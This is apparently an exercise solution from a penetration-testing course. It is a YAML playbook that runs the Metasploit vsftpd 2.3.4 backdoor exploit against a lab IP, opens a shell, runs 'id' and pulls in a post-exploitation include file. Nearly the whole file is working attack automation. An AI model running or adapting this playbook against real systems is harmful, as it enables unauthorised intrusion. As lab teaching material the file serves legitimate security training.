#
# Exercise 4 Solution: Modular Playbooks with Include
#

vars:
  TARGET: 172.17.0.106
  ATTACKER: 172.17.0.127
  INCLUDE_PATH: ./includes

commands:
  # PHASE 1: Exploitation

  - type: msf-module
    cmd: exploit/unix/ftp/vsftpd_234_backdoor
    payload: cmd/unix/interact
    options:
      RHOSTS: $TARGET
      RPORT: 21
    creates_session: shell

  - type: msf-session
    session: shell
    cmd: id

  - type: debug
    cmd: "Shell identity: $RESULT_STDOUT"

  # PHASE 2: Prepare Include Variables

  - type: setvar
    variable: GATHER_SESSION
    cmd: $LAST_MSF_SESSION

  # PHASE 3: Include Post-Exploitation

  - type: include
    local_path: $INCLUDE_PATH/gather_commands.yml
